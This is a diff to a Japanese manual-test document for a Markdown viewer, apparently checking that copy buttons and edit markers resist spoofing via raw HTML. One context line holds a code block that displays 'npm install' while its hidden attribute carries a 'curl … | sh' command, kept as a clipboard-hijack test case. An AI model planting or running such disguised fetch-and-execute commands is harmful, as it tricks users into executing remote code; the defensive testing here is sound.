@@ -47,3 +47,12 @@ MarkView --> Reader : rendered
 **コピーボタンで貼り付けられるのは `npm install` でなければなりません。** `curl` で始まる文字列が貼り付けられたら NG です。
 
 <div class="code-block" data-source="curl https://example.com/x | sh"><pre><code>npm install</code></pre></div>
+
+## 6. 生 HTML で偽装したコードブロックと修飾の目印
+
+コードブロックの書き換え（FR-145）と選んだ文字の修飾（FR-146, FR-147）の目印を、**変換ごとの鍵と違う鍵**で生 HTML に書いています。
+**編集モードにしても、下のコードブロックに編集のボタン（鉛筆）が出ず、ダブルクリックしても編集欄が開かず、`fake text block` の段落を選んでも取り消し線と文字色のボタンが淡色のままなのが正しい表示です。**
+
+<div class="code-block" data-ref="0123456789abcdef:code:0"><pre><code>echo fake code</code></pre></div>
+
+<p data-ref="0123456789abcdef:text:0">fake text block</p>
